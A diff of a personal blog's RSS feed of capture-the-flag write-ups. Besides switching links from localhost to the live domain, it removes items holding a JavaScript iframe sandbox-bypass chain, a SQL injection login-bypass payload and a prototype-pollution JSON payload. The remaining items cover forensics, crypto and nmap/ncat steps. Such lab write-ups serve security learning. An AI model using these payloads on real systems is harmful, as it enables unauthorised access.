@@ -2,49 +2,17 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title></title>
-    <link>http://localhost:1313/ctf-writeups/</link>
+    <link>https://hritik.sh/ctf-writeups/</link>
     <description>Recent content on </description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Wed, 02 Jul 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/ctf-writeups/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Google CTF postviewer all versions</title>
-      <link>http://localhost:1313/ctf-writeups/gctf-postviewer/</link>
-      <pubDate>Wed, 02 Jul 2025 00:00:00 +0000</pubDate>
-      
-      <guid>http://localhost:1313/ctf-writeups/gctf-postviewer/</guid>
-      <description>&lt;h1 id=&#34;postviewer-2023&#34;&gt;Postviewer 2023&lt;/h1&gt;
-&lt;p&gt;Assume, attacker&amp;rsquo;s page: &lt;a href=&#34;http://hritik.sh&#34;&gt;http://hritik.sh&lt;/a&gt;
-iframe shim page: &lt;a href=&#34;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&#34;&gt;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&lt;/a&gt;&lt;/p&gt;
-&lt;pre class=&#34;language-javascript&#34;&gt;&lt;code&gt;ifr1 = document.createElement(&amp;#39;iframe&amp;#39;)
-ifr1.src = &amp;#39;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&amp;#39;
-document.body.appendChild(ifr1)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bypass &lt;code&gt;allow-same-origin&lt;/code&gt; regex check (&lt;code&gt;/g&lt;/code&gt;) and create an iframe:&lt;/p&gt;</description>
-      <content>&lt;h1 id=&#34;postviewer-2023&#34;&gt;Postviewer 2023&lt;/h1&gt;
-&lt;p&gt;Assume, attacker&amp;rsquo;s page: &lt;a href=&#34;http://hritik.sh&#34;&gt;http://hritik.sh&lt;/a&gt;
-iframe shim page: &lt;a href=&#34;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&#34;&gt;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&lt;/a&gt;&lt;/p&gt;
-&lt;pre class=&#34;language-javascript&#34;&gt;&lt;code&gt;ifr1 = document.createElement(&amp;#39;iframe&amp;#39;)
-ifr1.src = &amp;#39;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&amp;#39;
-document.body.appendChild(ifr1)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bypass &lt;code&gt;allow-same-origin&lt;/code&gt; regex check (&lt;code&gt;/g&lt;/code&gt;) and create an iframe:&lt;/p&gt;
-&lt;pre class=&#34;language-javascript&#34;&gt;&lt;code&gt;ifr1.contentWindow.postMessage({&amp;#39;body&amp;#39;: &amp;#39;&amp;lt;iframe name=&amp;#34;ifr2&amp;#34; id=&amp;#34;ifr2&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;script&amp;gt; onmessage= (e) =&amp;gt; {console.log(eval(e.data))}&amp;lt;/script&amp;gt;&amp;#39;, &amp;#39;mimeType&amp;#39;:&amp;#39;text/html&amp;#39;, &amp;#39;sandbox&amp;#39;: [&amp;#39;allow-same-origin&amp;#39;, &amp;#39;allow-same-origin&amp;#39;, &amp;#39;allow-scripts&amp;#39;]}, &amp;#34;*&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Create a blob iframe inside of this iframe (parent CSP allows blob only and CSP propagates in local schemes, see: &lt;a href=&#34;https://www.w3.org/TR/CSP3/#security-inherit-csp&#34;&gt;w3org&lt;/a&gt;).
-This iframe will have access to &lt;code&gt;location.ancestorOrigins&lt;/code&gt; and thus leak the random sub-domain (&lt;code&gt;aeu&lt;/code&gt;).
-This is why &lt;code&gt;allow-same-origin&lt;/code&gt; bypass was required, otherwise &lt;code&gt;origin&lt;/code&gt; is set to &lt;code&gt;null&lt;/code&gt; in &lt;code&gt;sandbox&lt;/code&gt;.&lt;/p&gt;
-&lt;pre class=&#34;language-javascript&#34;&gt;&lt;code&gt;top[0][0].postMessage(&amp;#34;blob = new Blob([&amp;#39;&amp;lt;script&amp;gt;top.postMessage(window.location.ancestorOrigins[0], \&amp;#34;*\&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;], {type: &amp;#39;text/html&amp;#39;}); document.getElementById(&amp;#39;ifr2&amp;#39;).src=URL.createObjectURL(blob)&amp;#34;, &amp;#34;*&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;a href=&#34;https://github.com/google/google-ctf/tree/main/2023/quals/web-postviewer2#top-redirection&#34;&gt;top redirection&lt;/a&gt; section terjanq says (1) as well could be a Chrome bug because of the comment that says that the ancestor chain should be respected.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;// Top navigation is forbidden in sandboxed frames unless opted-in, and only
-// then if the ancestor chain allowed to navigate the top frame.
-// Note: We don&amp;rsquo;t check root fenced frames for kTop* flags since the kTop*
-// flags imply the actual top-level page.&lt;/p&gt;&lt;/blockquote&gt;
-&lt;p&gt;Although, it is NOT a chrome bug as ancestor chain &lt;em&gt;is&lt;/em&gt; respected. Here, the top frame is allowed to navigate the iframe because it does not have &lt;code&gt;sandbox&lt;/code&gt; set at all.&lt;/p&gt;
-&lt;p&gt;I was unable to reproduce his openee-opener trick.&lt;/p&gt;
-</content>
-    </item>
-    
+    <lastBuildDate>Wed, 02 Jul 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://hritik.sh/ctf-writeups/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Bsides Bangalore 2024</title>
-      <link>http://localhost:1313/ctf-writeups/bsides-bangalore-2024/</link>
+      <link>https://hritik.sh/ctf-writeups/bsides-bangalore-2024/</link>
       <pubDate>Sun, 30 Jun 2024 00:00:00 +0000</pubDate>
       
-      <guid>http://localhost:1313/ctf-writeups/bsides-bangalore-2024/</guid>
+      <guid>https://hritik.sh/ctf-writeups/bsides-bangalore-2024/</guid>
       <description>&lt;h1 id=&#34;forensics-no-malware-on-file&#34;&gt;Forensics: No malware on file&lt;/h1&gt;
 &lt;p&gt;Not having access to vol2 or a windows box, I wasted entire time getting vol2 working on arm or windows running. Biggest fault!&lt;/p&gt;</description>
       <content>&lt;h1 id=&#34;forensics-no-malware-on-file&#34;&gt;Forensics: No malware on file&lt;/h1&gt;
@@ -78,7 +46,7 @@ Binwalk does not extract all detected. Give &lt;code&gt;-D &#39;.*&#39;&lt;/code
 &lt;li&gt;Upload found exe to virustotal or any.run or run in windows&lt;/li&gt;
 &lt;li&gt;grep for MetaCTF{&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;See my &lt;a href=&#34;http://localhost:1313/cheatsheets/volatality/&#34;&gt;cheatsheet&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;See my &lt;a href=&#34;https://hritik.sh/cheatsheets/volatality/&#34;&gt;cheatsheet&lt;/a&gt;.&lt;/p&gt;
 &lt;h1 id=&#34;crypto-twist-and-shout&#34;&gt;Crypto: Twist and Shout&lt;/h1&gt;
 &lt;p&gt;This is based on the fact that python&amp;rsquo;s rand function is predictable/calculable when you have enough inputs.&lt;br&gt;
 It uses Mersenne Twister whose entire state can be calculated with 624 consecutive inputs
@@ -301,65 +269,6 @@ It&amp;#39;s not UDP.&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Get the flag&lt;/p&gt;
 &lt;pre class=&#34;language-text&#34;&gt;&lt;code&gt;# nmap 192.168.0.132 -sO -T5
 132      open   sctp
 # ncat --sctp 192.168.0.132 10&lt;/code&gt;&lt;/pre&gt;</content>
-    </item>
-    
-    <item>
-      <title>BlackHat MEA Qualification CTF</title>
-      <link>http://localhost:1313/ctf-writeups/blackhat-mea-qual/</link>
-      <pubDate>Mon, 09 Oct 2023 00:00:00 +0000</pubDate>
-      
-      <guid>http://localhost:1313/ctf-writeups/blackhat-mea-qual/</guid>
-      <description>&lt;h1 id=&#34;warm-me-up&#34;&gt;Warm me up&lt;/h1&gt;
-&lt;p&gt;Flask based application.
-Cookie leaks OTP value.&lt;/p&gt;
-&lt;p&gt;username and password field is vulnerable to sql injection. A union based injection gives redirection to /flag with login cookie set.
-Payload:
-b&amp;rsquo; UNION ALL SELECT &amp;lsquo;admin&amp;rsquo;,&amp;lsquo;daa&amp;rsquo; &amp;ndash;&lt;/p&gt;</description>
-      <content>&lt;h1 id=&#34;warm-me-up&#34;&gt;Warm me up&lt;/h1&gt;
-&lt;p&gt;Flask based application.
-Cookie leaks OTP value.&lt;/p&gt;
-&lt;p&gt;username and password field is vulnerable to sql injection. A union based injection gives redirection to /flag with login cookie set.
-Payload:
-b&amp;rsquo; UNION ALL SELECT &amp;lsquo;admin&amp;rsquo;,&amp;lsquo;daa&amp;rsquo; &amp;ndash;&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;It&amp;rsquo;d be interested to see the source code for this&lt;/em&gt;&lt;/p&gt;
-&lt;h1 id=&#34;hardy&#34;&gt;Hardy&lt;/h1&gt;
-&lt;p&gt;x-forwarded-for changes the IP being attacked.&lt;/p&gt;
-&lt;h1 id=&#34;what-am-i&#34;&gt;What am I?&lt;/h1&gt;
-&lt;p&gt;After banging head at multiple decompilers, &lt;a href=&#34;https://manalyzer.org&#34;&gt;https://manalyzer.org&lt;/a&gt; showed a bmp image in &amp;ldquo;Resources&amp;rdquo; section
-Cheat: I searched md5sum of dll on google and it was in manalyzer logs&lt;/p&gt;
-&lt;h1 id=&#34;not-supported&#34;&gt;Not supported&lt;/h1&gt;
-&lt;p&gt;vol.py -f memdump.mem windows.pslist | grep -i notepad
-get pid
-vol.py -f memdump.mem -o dump_dir windows.memmap ‑‑dump ‑‑pid &lt;PID&gt;
-(need linux for this one, hey lima)
-strings -e l &lt;dumpfile&gt;
-look for bhflag, remove spaces, submit without flag format as prescribed&lt;/p&gt;
-&lt;h1 id=&#34;extend&#34;&gt;Extend&lt;/h1&gt;
-&lt;p&gt;Do some basic vodoo to get the chrome dir. Now what ?&lt;/p&gt;
-</content>
-    </item>
-    
-    <item>
-      <title>Maple CTF 2023</title>
-      <link>http://localhost:1313/ctf-writeups/maple-2023/</link>
-      <pubDate>Sun, 01 Oct 2023 00:00:00 +0000</pubDate>
-      
-      <guid>http://localhost:1313/ctf-writeups/maple-2023/</guid>
-      <description>&lt;h1 id=&#34;blade-runner&#34;&gt;Blade Runner&lt;/h1&gt;
-&lt;p&gt;Vulnerable code:&lt;/p&gt;
-&lt;pre class=&#34;language-javascript&#34;&gt;&lt;code&gt;        obj[k.toLowerCase()] = req.body[k];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This can lead to prototype pollution in obj. Don&amp;rsquo;t set &amp;ldquo;username&amp;rdquo; in obj and &lt;strong&gt;proto&lt;/strong&gt; pollute &amp;ldquo;username&amp;rdquo;
-Payload:&lt;/p&gt;</description>
-      <content>&lt;h1 id=&#34;blade-runner&#34;&gt;Blade Runner&lt;/h1&gt;
-&lt;p&gt;Vulnerable code:&lt;/p&gt;
-&lt;pre class=&#34;language-javascript&#34;&gt;&lt;code&gt;        obj[k.toLowerCase()] = req.body[k];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This can lead to prototype pollution in obj. Don&amp;rsquo;t set &amp;ldquo;username&amp;rdquo; in obj and &lt;strong&gt;proto&lt;/strong&gt; pollute &amp;ldquo;username&amp;rdquo;
-Payload:&lt;/p&gt;
-&lt;pre class=&#34;language-json&#34;&gt;&lt;code&gt;{
-  &amp;#34;__proto__&amp;#34;: {
-    &amp;#34;username&amp;#34;: &amp;#34;admin&amp;#34;
-  },
-  &amp;#34;password&amp;#34;: &amp;#34;admin&amp;#34;
-}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Reference: &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution&#34;&gt;https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution&lt;/a&gt;&lt;/p&gt;
-</content>
     </item>
     
   </channel>
